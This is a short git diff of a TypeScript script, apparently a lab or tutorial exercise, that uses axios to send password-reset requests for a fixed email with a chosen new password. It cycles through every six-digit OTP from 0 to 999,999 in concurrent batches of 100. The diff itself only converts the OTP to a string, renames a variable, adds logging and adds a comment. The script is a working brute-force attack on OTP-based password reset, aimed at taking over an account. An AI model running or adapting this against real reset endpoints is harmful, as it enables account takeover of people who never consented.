@@ -4,7 +4,7 @@ import axios from "axios";
 async function sendRequest(otp: number) {
   let data = JSON.stringify({
     "email": "vishal@gmail.com",
-    "otp": otp,
+    "otp": otp.toString(),
     "newPassword": "123123123"
   });
 
@@ -29,13 +29,14 @@ async function sendRequest(otp: number) {
 //calling the function in a loop to send multiple requests
 async function main() {
   for (let i = 0; i < 1000000; i += 100) {
-    const promises = [];
-  
+    const batch_array = [];
+    console.log(i);
+
     //sending in a batch of 100 requests
     for (let j = 0; j < 100; j++) {
-      promises.push(sendRequest(i + j))
+      batch_array.push(sendRequest(i + j))
     }
-    await Promise.all(promises);
+    await Promise.all(batch_array); //wait for all requests in this batch to complete only then conitinue to the next batch
   }
 }
 
